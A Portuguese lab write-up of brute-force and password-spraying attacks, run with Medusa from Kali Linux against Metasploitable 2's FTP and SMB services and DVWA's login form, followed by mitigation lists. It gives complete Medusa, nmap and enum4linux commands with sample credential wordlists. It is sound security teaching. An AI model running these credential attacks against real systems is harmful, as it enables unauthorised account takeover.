# Simulação de Força Bruta com Kali Linux e Medusa

## Objetivo

Este projeto demonstra, em laboratório autorizado, ataques controlados de força bruta contra:

- FTP no Metasploitable 2;
- formulário de login do DVWA;
- SMB no Metasploitable 2.

O objetivo é compreender o funcionamento das técnicas e demonstrar medidas efetivas de prevenção.

> Todos os testes foram realizados em ambiente virtual isolado.

## Ambiente

| Máquina | Função | Endereço |
|---|---|---|
| Kali Linux | Máquina atacante | 192.168.56.10 |
| Metasploitable 2 | Máquina alvo | 192.168.56.20 |

Rede configurada no VirtualBox:

- Adaptador 1: Host-only;
- Adaptador 2: Rede interna, opcional;
- A ponte ou NAT foi evitada para impedir exposição externa.

## Validação da rede

```bash
ip addr
ping 192.168.56.20
nmap -sV 192.168.56.20
nmap -sV -p 21,80,139,445 192.168.56.20
```

## Wordlists utilizadas

`wordlists/users.txt`

```text
msfadmin
user
admin
ftp
```

`wordlists/passwords.txt`

```text
123456
password
msfadmin
letmein
qwerty
admin
```

## Ataque FTP

Enumere o serviço:

```bash
nmap -p 21 -sV 192.168.56.20
```

Execute o Medusa:

```bash
medusa -h 192.168.56.20 \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -M ftp
```

Teste de acesso:

```bash
ftp 192.168.56.20
```

### Evidências esperadas

- Porta 21 aberta;
- Serviço identificado como FTP;
- Resultado `ACCOUNT FOUND` do Medusa;
- Login confirmado manualmente.

## Ataque ao formulário web — DVWA

Configure o DVWA:

1. Acesse `http://192.168.56.20/dvwa`;
2. Configure o nível de segurança como baixo;
3. Abra `DVWA → Brute Force`;
4. Identifique os parâmetros enviados pelo formulário;
5. Capture o `POST` com o navegador ou DevTools.

Exemplo conceitual:

```text
POST /dvwa/vulnerabilities/brute/
username=<usuario>&password=<senha>&Login=Login
```

Com Medusa:

```bash
medusa -h 192.168.56.20 \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -M http \
  -m PAGE:'/dvwa/vulnerabilities/brute/' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Username and/or password incorrect'
```

Os parâmetros podem variar conforme o DVWA, o servidor web e o nível de segurança. Sempre confirme a mensagem exibida após uma tentativa inválida.

## Password spraying em SMB

Liste recursos SMB:

```bash
nmap -p 139,445 --script smb-os-discovery 192.168.56.20
enum4linux 192.168.56.20
```

Exemplo de teste:

```bash
medusa -h 192.168.56.20 \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -M smbnt
```

Uma senha por vez permite representar melhor o password spraying:

```bash
medusa -h 192.168.56.20 \
  -u msfadmin \
  -P wordlists/passwords.txt \
  -M smbnt
```

Validação:

```bash
smbclient -L //192.168.56.20 -U msfadmin
```

## Mitigações

### FTP

- Desabilitar FTP ou substituir por SFTP;
- Usar autenticação forte;
- Aplicar MFA quando disponível;
- Bloquear contas após tentativas excessivas;
- Limitar tentativas por origem;
- Monitorar logs e criar alertas;
- Utilizar TLS.

### Aplicações web

- MFA;
- Captcha após falhas;
- Bloqueio ou atraso progressivo;
- Proteção contra abuso de sessão;
- Políticas fortes de senha;
- Limite de taxa por IP e usuário;
- Registros de auditoria;
- Proteção contra enumeration de usuários.

### SMB

- Bloquear SMB legado;
- Utilizar SMB Signing;
- Desabilitar SMBv1;
- Aplicar políticas de bloqueio;
- Utilizar contas administrativas distintas;
- Restringir SMB a redes administrativas;
- Detectar padrões de password spraying;
- Habilitar autenticação moderna.

## Conclusões

Neste laboratório foi possível observar como ferramentas automatizadas testam credenciais em serviços distintos.

Os principais aprendizados foram:

- A necessidade de limitar tentativas de autenticação;
- A importância de logs e monitoramento;
- A diferença entre brute force tradicional e password spraying;
- Os riscos de protocolos legados;
- Como configurar um laboratório isolado;
- Como documentar evidências de forma técnica e organizada.
